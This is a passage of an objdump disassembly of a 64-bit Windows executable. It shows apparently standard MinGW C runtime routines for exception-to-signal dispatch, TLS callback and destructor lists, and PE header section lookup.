   140001e44:	48 8d 0d 2d 24 00 00 	lea    0x242d(%rip),%rcx        # 0x140004278
   140001e4b:	e8 d0 fa ff ff       	call   0x140001920
   140001e50:	48 8d 0d e9 23 00 00 	lea    0x23e9(%rip),%rcx        # 0x140004240
   140001e57:	e8 c4 fa ff ff       	call   0x140001920
   140001e5c:	90                   	nop
   140001e5d:	90                   	nop
   140001e5e:	90                   	nop
   140001e5f:	90                   	nop
   140001e60:	55                   	push   %rbp
   140001e61:	48 89 e5             	mov    %rsp,%rbp
   140001e64:	48 83 ec 50          	sub    $0x50,%rsp
   140001e68:	48 8b 05 41 52 00 00 	mov    0x5241(%rip),%rax        # 0x1400070b0
   140001e6f:	66 0f 14 d3          	unpcklpd %xmm3,%xmm2
   140001e73:	48 85 c0             	test   %rax,%rax
   140001e76:	74 1c                	je     0x140001e94
   140001e78:	f2 0f 10 45 30       	movsd  0x30(%rbp),%xmm0
   140001e7d:	89 4d d0             	mov    %ecx,-0x30(%rbp)
   140001e80:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140001e84:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
   140001e88:	0f 11 55 e0          	movups %xmm2,-0x20(%rbp)
   140001e8c:	f2 0f 11 45 f0       	movsd  %xmm0,-0x10(%rbp)
   140001e91:	ff d0                	call   *%rax
   140001e93:	90                   	nop
   140001e94:	48 83 c4 50          	add    $0x50,%rsp
   140001e98:	5d                   	pop    %rbp
   140001e99:	c3                   	ret
   140001e9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001ea0:	48 89 0d 09 52 00 00 	mov    %rcx,0x5209(%rip)        # 0x1400070b0
   140001ea7:	e9 34 09 00 00       	jmp    0x1400027e0
   140001eac:	90                   	nop
   140001ead:	90                   	nop
   140001eae:	90                   	nop
   140001eaf:	90                   	nop
   140001eb0:	55                   	push   %rbp
   140001eb1:	53                   	push   %rbx
   140001eb2:	48 83 ec 28          	sub    $0x28,%rsp
   140001eb6:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   140001ebb:	48 8b 11             	mov    (%rcx),%rdx
   140001ebe:	8b 02                	mov    (%rdx),%eax
   140001ec0:	48 89 cb             	mov    %rcx,%rbx
   140001ec3:	89 c1                	mov    %eax,%ecx
   140001ec5:	81 e1 ff ff ff 20    	and    $0x20ffffff,%ecx
   140001ecb:	81 f9 43 43 47 20    	cmp    $0x20474343,%ecx
   140001ed1:	0f 84 b9 00 00 00    	je     0x140001f90
   140001ed7:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
   140001edc:	77 49                	ja     0x140001f27
   140001ede:	3d 8b 00 00 c0       	cmp    $0xc000008b,%eax
   140001ee3:	76 5b                	jbe    0x140001f40
   140001ee5:	05 73 ff ff 3f       	add    $0x3fffff73,%eax
   140001eea:	83 f8 09             	cmp    $0x9,%eax
   140001eed:	0f 87 8d 00 00 00    	ja     0x140001f80
   140001ef3:	48 8d 15 06 24 00 00 	lea    0x2406(%rip),%rdx        # 0x140004300
   140001efa:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   140001efe:	48 01 d0             	add    %rdx,%rax
   140001f01:	ff e0                	jmp    *%rax
   140001f03:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001f08:	31 d2                	xor    %edx,%edx
   140001f0a:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001f0f:	e8 34 09 00 00       	call   0x140002848
   140001f14:	48 83 f8 01          	cmp    $0x1,%rax
   140001f18:	0f 84 36 01 00 00    	je     0x140002054
   140001f1e:	48 85 c0             	test   %rax,%rax
   140001f21:	0f 85 f9 00 00 00    	jne    0x140002020
   140001f27:	48 8b 05 a2 51 00 00 	mov    0x51a2(%rip),%rax        # 0x1400070d0
   140001f2e:	48 85 c0             	test   %rax,%rax
   140001f31:	74 6d                	je     0x140001fa0
   140001f33:	48 89 d9             	mov    %rbx,%rcx
   140001f36:	48 83 c4 28          	add    $0x28,%rsp
   140001f3a:	5b                   	pop    %rbx
   140001f3b:	5d                   	pop    %rbp
   140001f3c:	48 ff e0             	rex.W jmp *%rax
   140001f3f:	90                   	nop
   140001f40:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
   140001f45:	0f 84 a5 00 00 00    	je     0x140001ff0
   140001f4b:	76 63                	jbe    0x140001fb0
   140001f4d:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
   140001f52:	74 2c                	je     0x140001f80
   140001f54:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
   140001f59:	75 cc                	jne    0x140001f27
   140001f5b:	31 d2                	xor    %edx,%edx
   140001f5d:	b9 04 00 00 00       	mov    $0x4,%ecx
   140001f62:	e8 e1 08 00 00       	call   0x140002848
   140001f67:	48 83 f8 01          	cmp    $0x1,%rax
   140001f6b:	0f 84 cf 00 00 00    	je     0x140002040
   140001f71:	48 85 c0             	test   %rax,%rax
   140001f74:	74 b1                	je     0x140001f27
   140001f76:	b9 04 00 00 00       	mov    $0x4,%ecx
   140001f7b:	ff d0                	call   *%rax
   140001f7d:	0f 1f 00             	nopl   (%rax)
   140001f80:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140001f85:	eb 1b                	jmp    0x140001fa2
   140001f87:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140001f8e:	00 00 
   140001f90:	f6 42 04 01          	testb  $0x1,0x4(%rdx)
   140001f94:	0f 85 3d ff ff ff    	jne    0x140001ed7
   140001f9a:	eb e4                	jmp    0x140001f80
   140001f9c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001fa0:	31 c0                	xor    %eax,%eax
   140001fa2:	48 83 c4 28          	add    $0x28,%rsp
   140001fa6:	5b                   	pop    %rbx
   140001fa7:	5d                   	pop    %rbp
   140001fa8:	c3                   	ret
   140001fa9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001fb0:	3d 02 00 00 80       	cmp    $0x80000002,%eax
   140001fb5:	0f 85 6c ff ff ff    	jne    0x140001f27
   140001fbb:	eb c3                	jmp    0x140001f80
   140001fbd:	0f 1f 00             	nopl   (%rax)
   140001fc0:	31 d2                	xor    %edx,%edx
   140001fc2:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001fc7:	e8 7c 08 00 00       	call   0x140002848
   140001fcc:	48 83 f8 01          	cmp    $0x1,%rax
   140001fd0:	0f 85 48 ff ff ff    	jne    0x140001f1e
   140001fd6:	ba 01 00 00 00       	mov    $0x1,%edx
   140001fdb:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001fe0:	e8 63 08 00 00       	call   0x140002848
   140001fe5:	eb 99                	jmp    0x140001f80
   140001fe7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140001fee:	00 00 
   140001ff0:	31 d2                	xor    %edx,%edx
   140001ff2:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140001ff7:	e8 4c 08 00 00       	call   0x140002848
   140001ffc:	48 83 f8 01          	cmp    $0x1,%rax
   140002000:	74 2a                	je     0x14000202c
   140002002:	48 85 c0             	test   %rax,%rax
   140002005:	0f 84 1c ff ff ff    	je     0x140001f27
   14000200b:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140002010:	ff d0                	call   *%rax
   140002012:	e9 69 ff ff ff       	jmp    0x140001f80
   140002017:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000201e:	00 00 
   140002020:	b9 08 00 00 00       	mov    $0x8,%ecx
   140002025:	ff d0                	call   *%rax
   140002027:	e9 54 ff ff ff       	jmp    0x140001f80
   14000202c:	ba 01 00 00 00       	mov    $0x1,%edx
   140002031:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140002036:	e8 0d 08 00 00       	call   0x140002848
   14000203b:	e9 40 ff ff ff       	jmp    0x140001f80
   140002040:	ba 01 00 00 00       	mov    $0x1,%edx
   140002045:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000204a:	e8 f9 07 00 00       	call   0x140002848
   14000204f:	e9 2c ff ff ff       	jmp    0x140001f80
   140002054:	ba 01 00 00 00       	mov    $0x1,%edx
   140002059:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000205e:	e8 e5 07 00 00       	call   0x140002848
   140002063:	e8 a8 f8 ff ff       	call   0x140001910
   140002068:	e9 13 ff ff ff       	jmp    0x140001f80
   14000206d:	90                   	nop
   14000206e:	90                   	nop
   14000206f:	90                   	nop
   140002070:	55                   	push   %rbp
   140002071:	41 55                	push   %r13
   140002073:	41 54                	push   %r12
   140002075:	57                   	push   %rdi
   140002076:	56                   	push   %rsi
   140002077:	53                   	push   %rbx
   140002078:	48 83 ec 28          	sub    $0x28,%rsp
   14000207c:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   140002081:	4c 8d 2d 78 50 00 00 	lea    0x5078(%rip),%r13        # 0x140007100
   140002088:	4c 89 e9             	mov    %r13,%rcx
   14000208b:	ff 15 37 61 00 00    	call   *0x6137(%rip)        # 0x1400081c8
   140002091:	48 8b 1d 48 50 00 00 	mov    0x5048(%rip),%rbx        # 0x1400070e0
   140002098:	48 85 db             	test   %rbx,%rbx
   14000209b:	74 38                	je     0x1400020d5
   14000209d:	4c 8b 25 74 61 00 00 	mov    0x6174(%rip),%r12        # 0x140008218
   1400020a4:	48 8b 3d 2d 61 00 00 	mov    0x612d(%rip),%rdi        # 0x1400081d8
   1400020ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400020b0:	8b 0b                	mov    (%rbx),%ecx
   1400020b2:	41 ff d4             	call   *%r12
   1400020b5:	48 89 c6             	mov    %rax,%rsi
   1400020b8:	ff d7                	call   *%rdi
   1400020ba:	48 85 f6             	test   %rsi,%rsi
   1400020bd:	74 0d                	je     0x1400020cc
   1400020bf:	85 c0                	test   %eax,%eax
   1400020c1:	75 09                	jne    0x1400020cc
   1400020c3:	48 8b 43 08          	mov    0x8(%rbx),%rax
   1400020c7:	48 89 f1             	mov    %rsi,%rcx
   1400020ca:	ff d0                	call   *%rax
   1400020cc:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   1400020d0:	48 85 db             	test   %rbx,%rbx
   1400020d3:	75 db                	jne    0x1400020b0
   1400020d5:	4c 89 e9             	mov    %r13,%rcx
   1400020d8:	48 83 c4 28          	add    $0x28,%rsp
   1400020dc:	5b                   	pop    %rbx
   1400020dd:	5e                   	pop    %rsi
   1400020de:	5f                   	pop    %rdi
   1400020df:	41 5c                	pop    %r12
   1400020e1:	41 5d                	pop    %r13
   1400020e3:	5d                   	pop    %rbp
   1400020e4:	48 ff 25 15 61 00 00 	rex.W jmp *0x6115(%rip)        # 0x140008200
   1400020eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400020f0:	55                   	push   %rbp
   1400020f1:	57                   	push   %rdi
   1400020f2:	56                   	push   %rsi
   1400020f3:	53                   	push   %rbx
   1400020f4:	48 83 ec 28          	sub    $0x28,%rsp
   1400020f8:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   1400020fd:	8b 05 e5 4f 00 00    	mov    0x4fe5(%rip),%eax        # 0x1400070e8
   140002103:	89 cf                	mov    %ecx,%edi
   140002105:	48 89 d6             	mov    %rdx,%rsi
   140002108:	85 c0                	test   %eax,%eax
   14000210a:	75 14                	jne    0x140002120
   14000210c:	31 c0                	xor    %eax,%eax
   14000210e:	48 83 c4 28          	add    $0x28,%rsp
   140002112:	5b                   	pop    %rbx
   140002113:	5e                   	pop    %rsi
   140002114:	5f                   	pop    %rdi
   140002115:	5d                   	pop    %rbp
   140002116:	c3                   	ret
   140002117:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000211e:	00 00 
   140002120:	ba 18 00 00 00       	mov    $0x18,%edx
   140002125:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000212a:	e8 e1 06 00 00       	call   0x140002810
   14000212f:	48 89 c3             	mov    %rax,%rbx
   140002132:	48 85 c0             	test   %rax,%rax
   140002135:	74 33                	je     0x14000216a
   140002137:	48 89 70 08          	mov    %rsi,0x8(%rax)
   14000213b:	48 8d 35 be 4f 00 00 	lea    0x4fbe(%rip),%rsi        # 0x140007100
   140002142:	89 38                	mov    %edi,(%rax)
   140002144:	48 89 f1             	mov    %rsi,%rcx
   140002147:	ff 15 7b 60 00 00    	call   *0x607b(%rip)        # 0x1400081c8
   14000214d:	48 8b 05 8c 4f 00 00 	mov    0x4f8c(%rip),%rax        # 0x1400070e0
   140002154:	48 89 f1             	mov    %rsi,%rcx
   140002157:	48 89 1d 82 4f 00 00 	mov    %rbx,0x4f82(%rip)        # 0x1400070e0
   14000215e:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140002162:	ff 15 98 60 00 00    	call   *0x6098(%rip)        # 0x140008200
   140002168:	eb a2                	jmp    0x14000210c
   14000216a:	83 c8 ff             	or     $0xffffffff,%eax
   14000216d:	eb 9f                	jmp    0x14000210e
   14000216f:	90                   	nop
   140002170:	55                   	push   %rbp
   140002171:	56                   	push   %rsi
   140002172:	53                   	push   %rbx
   140002173:	48 83 ec 20          	sub    $0x20,%rsp
   140002177:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   14000217c:	8b 05 66 4f 00 00    	mov    0x4f66(%rip),%eax        # 0x1400070e8
   140002182:	89 cb                	mov    %ecx,%ebx
   140002184:	85 c0                	test   %eax,%eax
   140002186:	75 10                	jne    0x140002198
   140002188:	31 c0                	xor    %eax,%eax
   14000218a:	48 83 c4 20          	add    $0x20,%rsp
   14000218e:	5b                   	pop    %rbx
   14000218f:	5e                   	pop    %rsi
   140002190:	5d                   	pop    %rbp
   140002191:	c3                   	ret
   140002192:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002198:	48 8d 35 61 4f 00 00 	lea    0x4f61(%rip),%rsi        # 0x140007100
   14000219f:	48 89 f1             	mov    %rsi,%rcx
   1400021a2:	ff 15 20 60 00 00    	call   *0x6020(%rip)        # 0x1400081c8
   1400021a8:	48 8b 0d 31 4f 00 00 	mov    0x4f31(%rip),%rcx        # 0x1400070e0
   1400021af:	48 85 c9             	test   %rcx,%rcx
   1400021b2:	74 2f                	je     0x1400021e3
   1400021b4:	31 d2                	xor    %edx,%edx
   1400021b6:	eb 13                	jmp    0x1400021cb
   1400021b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400021bf:	00 
   1400021c0:	48 89 ca             	mov    %rcx,%rdx
   1400021c3:	48 85 c0             	test   %rax,%rax
   1400021c6:	74 1b                	je     0x1400021e3
   1400021c8:	48 89 c1             	mov    %rax,%rcx
   1400021cb:	8b 01                	mov    (%rcx),%eax
   1400021cd:	39 d8                	cmp    %ebx,%eax
   1400021cf:	48 8b 41 10          	mov    0x10(%rcx),%rax
   1400021d3:	75 eb                	jne    0x1400021c0
   1400021d5:	48 85 d2             	test   %rdx,%rdx
   1400021d8:	74 26                	je     0x140002200
   1400021da:	48 89 42 10          	mov    %rax,0x10(%rdx)
   1400021de:	e8 45 06 00 00       	call   0x140002828
   1400021e3:	48 89 f1             	mov    %rsi,%rcx
   1400021e6:	ff 15 14 60 00 00    	call   *0x6014(%rip)        # 0x140008200
   1400021ec:	31 c0                	xor    %eax,%eax
   1400021ee:	48 83 c4 20          	add    $0x20,%rsp
   1400021f2:	5b                   	pop    %rbx
   1400021f3:	5e                   	pop    %rsi
   1400021f4:	5d                   	pop    %rbp
   1400021f5:	c3                   	ret
   1400021f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400021fd:	00 00 00 
   140002200:	48 89 05 d9 4e 00 00 	mov    %rax,0x4ed9(%rip)        # 0x1400070e0
   140002207:	eb d5                	jmp    0x1400021de
   140002209:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002210:	55                   	push   %rbp
   140002211:	53                   	push   %rbx
   140002212:	48 83 ec 28          	sub    $0x28,%rsp
   140002216:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   14000221b:	83 fa 02             	cmp    $0x2,%edx
   14000221e:	0f 84 ac 00 00 00    	je     0x1400022d0
   140002224:	77 2a                	ja     0x140002250
   140002226:	85 d2                	test   %edx,%edx
   140002228:	74 46                	je     0x140002270
   14000222a:	8b 05 b8 4e 00 00    	mov    0x4eb8(%rip),%eax        # 0x1400070e8
   140002230:	85 c0                	test   %eax,%eax
   140002232:	0f 84 b8 00 00 00    	je     0x1400022f0
   140002238:	c7 05 a6 4e 00 00 01 	movl   $0x1,0x4ea6(%rip)        # 0x1400070e8
   14000223f:	00 00 00 
   140002242:	b8 01 00 00 00       	mov    $0x1,%eax
   140002247:	48 83 c4 28          	add    $0x28,%rsp
   14000224b:	5b                   	pop    %rbx
   14000224c:	5d                   	pop    %rbp
   14000224d:	c3                   	ret
   14000224e:	66 90                	xchg   %ax,%ax
   140002250:	83 fa 03             	cmp    $0x3,%edx
   140002253:	75 ed                	jne    0x140002242
   140002255:	8b 05 8d 4e 00 00    	mov    0x4e8d(%rip),%eax        # 0x1400070e8
   14000225b:	85 c0                	test   %eax,%eax
   14000225d:	74 e3                	je     0x140002242
   14000225f:	e8 0c fe ff ff       	call   0x140002070
   140002264:	eb dc                	jmp    0x140002242
   140002266:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000226d:	00 00 00 
   140002270:	8b 05 72 4e 00 00    	mov    0x4e72(%rip),%eax        # 0x1400070e8
   140002276:	85 c0                	test   %eax,%eax
   140002278:	75 6e                	jne    0x1400022e8
   14000227a:	8b 05 68 4e 00 00    	mov    0x4e68(%rip),%eax        # 0x1400070e8
   140002280:	83 f8 01             	cmp    $0x1,%eax
   140002283:	75 bd                	jne    0x140002242
   140002285:	48 8b 1d 54 4e 00 00 	mov    0x4e54(%rip),%rbx        # 0x1400070e0
   14000228c:	48 85 db             	test   %rbx,%rbx
   14000228f:	74 18                	je     0x1400022a9
   140002291:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002298:	48 89 d9             	mov    %rbx,%rcx
   14000229b:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   14000229f:	e8 84 05 00 00       	call   0x140002828
   1400022a4:	48 85 db             	test   %rbx,%rbx
   1400022a7:	75 ef                	jne    0x140002298
   1400022a9:	48 8d 0d 50 4e 00 00 	lea    0x4e50(%rip),%rcx        # 0x140007100
   1400022b0:	48 c7 05 25 4e 00 00 	movq   $0x0,0x4e25(%rip)        # 0x1400070e0
   1400022b7:	00 00 00 00 
   1400022bb:	c7 05 23 4e 00 00 00 	movl   $0x0,0x4e23(%rip)        # 0x1400070e8
   1400022c2:	00 00 00 
   1400022c5:	ff 15 f5 5e 00 00    	call   *0x5ef5(%rip)        # 0x1400081c0
   1400022cb:	e9 72 ff ff ff       	jmp    0x140002242
   1400022d0:	e8 3b f6 ff ff       	call   0x140001910
   1400022d5:	b8 01 00 00 00       	mov    $0x1,%eax
   1400022da:	48 83 c4 28          	add    $0x28,%rsp
   1400022de:	5b                   	pop    %rbx
   1400022df:	5d                   	pop    %rbp
   1400022e0:	c3                   	ret
   1400022e1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400022e8:	e8 83 fd ff ff       	call   0x140002070
   1400022ed:	eb 8b                	jmp    0x14000227a
   1400022ef:	90                   	nop
   1400022f0:	48 8d 0d 09 4e 00 00 	lea    0x4e09(%rip),%rcx        # 0x140007100
   1400022f7:	ff 15 fb 5e 00 00    	call   *0x5efb(%rip)        # 0x1400081f8
   1400022fd:	e9 36 ff ff ff       	jmp    0x140002238
   140002302:	90                   	nop
   140002303:	90                   	nop
   140002304:	90                   	nop
   140002305:	90                   	nop
   140002306:	90                   	nop
   140002307:	90                   	nop
   140002308:	90                   	nop
   140002309:	90                   	nop
   14000230a:	90                   	nop
   14000230b:	90                   	nop
   14000230c:	90                   	nop
   14000230d:	90                   	nop
   14000230e:	90                   	nop
   14000230f:	90                   	nop
   140002310:	31 c0                	xor    %eax,%eax
   140002312:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
   140002317:	75 0f                	jne    0x140002328
   140002319:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   14000231d:	48 01 d1             	add    %rdx,%rcx
   140002320:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140002326:	74 08                	je     0x140002330
   140002328:	c3                   	ret
   140002329:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002330:	31 c0                	xor    %eax,%eax
   140002332:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
   140002338:	0f 94 c0             	sete   %al
   14000233b:	c3                   	ret
   14000233c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002340:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   140002344:	48 01 c1             	add    %rax,%rcx
   140002347:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   14000234b:	44 0f b7 41 06       	movzwl 0x6(%rcx),%r8d
   140002350:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
   140002355:	66 45 85 c0          	test   %r8w,%r8w
   140002359:	74 32                	je     0x14000238d
   14000235b:	41 8d 48 ff          	lea    -0x1(%r8),%ecx
   14000235f:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   140002363:	4c 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%r9
   140002368:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000236f:	00 
   140002370:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   140002374:	4c 89 c1             	mov    %r8,%rcx
   140002377:	4c 39 c2             	cmp    %r8,%rdx
   14000237a:	72 08                	jb     0x140002384
   14000237c:	03 48 08             	add    0x8(%rax),%ecx
   14000237f:	48 39 ca             	cmp    %rcx,%rdx
   140002382:	72 0b                	jb     0x14000238f
   140002384:	48 83 c0 28          	add    $0x28,%rax
   140002388:	4c 39 c8             	cmp    %r9,%rax
   14000238b:	75 e3                	jne    0x140002370
   14000238d:	31 c0                	xor    %eax,%eax
   14000238f:	c3                   	ret
   140002390:	55                   	push   %rbp
   140002391:	57                   	push   %rdi
   140002392:	56                   	push   %rsi
   140002393:	53                   	push   %rbx
   140002394:	48 83 ec 28          	sub    $0x28,%rsp
   140002398:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   14000239d:	48 89 ce             	mov    %rcx,%rsi
   1400023a0:	e8 ab 04 00 00       	call   0x140002850
   1400023a5:	48 83 f8 08          	cmp    $0x8,%rax
   1400023a9:	77 7d                	ja     0x140002428
   1400023ab:	48 8b 15 de 1f 00 00 	mov    0x1fde(%rip),%rdx        # 0x140004390
   1400023b2:	31 db                	xor    %ebx,%ebx
   1400023b4:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
   1400023b9:	75 5b                	jne    0x140002416
   1400023bb:	48 63 42 3c          	movslq 0x3c(%rdx),%rax
   1400023bf:	48 01 d0             	add    %rdx,%rax
   1400023c2:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   1400023c8:	75 4c                	jne    0x140002416
   1400023ca:	66 81 78 18 0b 02    	cmpw   $0x20b,0x18(%rax)
   1400023d0:	75 44                	jne    0x140002416
   1400023d2:	0f b7 50 14          	movzwl 0x14(%rax),%edx
   1400023d6:	48 8d 5c 10 18       	lea    0x18(%rax,%rdx,1),%rbx
   1400023db:	0f b7 50 06          	movzwl 0x6(%rax),%edx
   1400023df:	66 85 d2             	test   %dx,%dx
   1400023e2:	74 44                	je     0x140002428
   1400023e4:	8d 42 ff             	lea    -0x1(%rdx),%eax
   1400023e7:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   1400023eb:	48 8d 7c c3 28       	lea    0x28(%rbx,%rax,8),%rdi
   1400023f0:	eb 0f                	jmp    0x140002401
   1400023f2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400023f8:	48 83 c3 28          	add    $0x28,%rbx
   1400023fc:	48 39 fb             	cmp    %rdi,%rbx
   1400023ff:	74 27                	je     0x140002428
   140002401:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140002407:	48 89 f2             	mov    %rsi,%rdx
   14000240a:	48 89 d9             	mov    %rbx,%rcx
   14000240d:	e8 46 04 00 00       	call   0x140002858
   140002412:	85 c0                	test   %eax,%eax
   140002414:	75 e2                	jne    0x1400023f8
   140002416:	48 89 d8             	mov    %rbx,%rax
   140002419:	48 83 c4 28          	add    $0x28,%rsp
   14000241d:	5b                   	pop    %rbx
   14000241e:	5e                   	pop    %rsi
   14000241f:	5f                   	pop    %rdi
   140002420:	5d                   	pop    %rbp
   140002421:	c3                   	ret
   140002422:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002428:	31 db                	xor    %ebx,%ebx
   14000242a:	48 89 d8             	mov    %rbx,%rax
   14000242d:	48 83 c4 28          	add    $0x28,%rsp
   140002431:	5b                   	pop    %rbx
   140002432:	5e                   	pop    %rsi
   140002433:	5f                   	pop    %rdi
   140002434:	5d                   	pop    %rbp
   140002435:	c3                   	ret
   140002436:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000243d:	00 00 00 
   140002440:	48 8b 15 49 1f 00 00 	mov    0x1f49(%rip),%rdx        # 0x140004390
   140002447:	31 c0                	xor    %eax,%eax
   140002449:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
   14000244e:	75 10                	jne    0x140002460
   140002450:	4c 63 42 3c          	movslq 0x3c(%rdx),%r8
   140002454:	49 01 d0             	add    %rdx,%r8
   140002457:	41 81 38 50 45 00 00 	cmpl   $0x4550,(%r8)
   14000245e:	74 08                	je     0x140002468
   140002460:	c3                   	ret
   140002461:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002468:	66 41 81 78 18 0b 02 	cmpw   $0x20b,0x18(%r8)
   14000246f:	75 ef                	jne    0x140002460
   140002471:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   140002476:	48 29 d1             	sub    %rdx,%rcx
   140002479:	49 8d 44 00 18       	lea    0x18(%r8,%rax,1),%rax
   14000247e:	45 0f b7 40 06       	movzwl 0x6(%r8),%r8d
   140002483:	66 45 85 c0          	test   %r8w,%r8w
   140002487:	74 34                	je     0x1400024bd
   140002489:	41 8d 50 ff          	lea    -0x1(%r8),%edx
   14000248d:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
   140002491:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
   140002496:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000249d:	00 00 00 
   1400024a0:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   1400024a4:	4c 89 c2             	mov    %r8,%rdx
   1400024a7:	4c 39 c1             	cmp    %r8,%rcx
   1400024aa:	72 08                	jb     0x1400024b4
   1400024ac:	03 50 08             	add    0x8(%rax),%edx
   1400024af:	48 39 d1             	cmp    %rdx,%rcx
   1400024b2:	72 ac                	jb     0x140002460
   1400024b4:	48 83 c0 28          	add    $0x28,%rax
   1400024b8:	4c 39 c8             	cmp    %r9,%rax
   1400024bb:	75 e3                	jne    0x1400024a0
   1400024bd:	31 c0                	xor    %eax,%eax
   1400024bf:	c3                   	ret
   1400024c0:	48 8b 05 c9 1e 00 00 	mov    0x1ec9(%rip),%rax        # 0x140004390
   1400024c7:	31 c9                	xor    %ecx,%ecx
   1400024c9:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   1400024ce:	75 0f                	jne    0x1400024df
   1400024d0:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   1400024d4:	48 01 d0             	add    %rdx,%rax
   1400024d7:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   1400024dd:	74 09                	je     0x1400024e8
   1400024df:	89 c8                	mov    %ecx,%eax
   1400024e1:	c3                   	ret
   1400024e2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400024e8:	66 81 78 18 0b 02    	cmpw   $0x20b,0x18(%rax)
   1400024ee:	75 ef                	jne    0x1400024df
   1400024f0:	0f b7 48 06          	movzwl 0x6(%rax),%ecx
   1400024f4:	89 c8                	mov    %ecx,%eax
   1400024f6:	c3                   	ret
   1400024f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400024fe:	00 00 
   140002500:	4c 8b 05 89 1e 00 00 	mov    0x1e89(%rip),%r8        # 0x140004390
   140002507:	31 c0                	xor    %eax,%eax
   140002509:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
   14000250f:	75 0f                	jne    0x140002520
   140002511:	49 63 50 3c          	movslq 0x3c(%r8),%rdx
   140002515:	4c 01 c2             	add    %r8,%rdx
   140002518:	81 3a 50 45 00 00    	cmpl   $0x4550,(%rdx)
   14000251e:	74 08                	je     0x140002528
   140002520:	c3                   	ret
   140002521:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002528:	66 81 7a 18 0b 02    	cmpw   $0x20b,0x18(%rdx)
   14000252e:	75 f0                	jne    0x140002520
   140002530:	0f b7 42 14          	movzwl 0x14(%rdx),%eax
   140002534:	44 0f b7 42 06       	movzwl 0x6(%rdx),%r8d
   140002539:	48 8d 44 02 18       	lea    0x18(%rdx,%rax,1),%rax
   14000253e:	66 45 85 c0          	test   %r8w,%r8w
   140002542:	74 2c                	je     0x140002570
   140002544:	41 8d 50 ff          	lea    -0x1(%r8),%edx
   140002548:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
   14000254c:	48 8d 54 d0 28       	lea    0x28(%rax,%rdx,8),%rdx
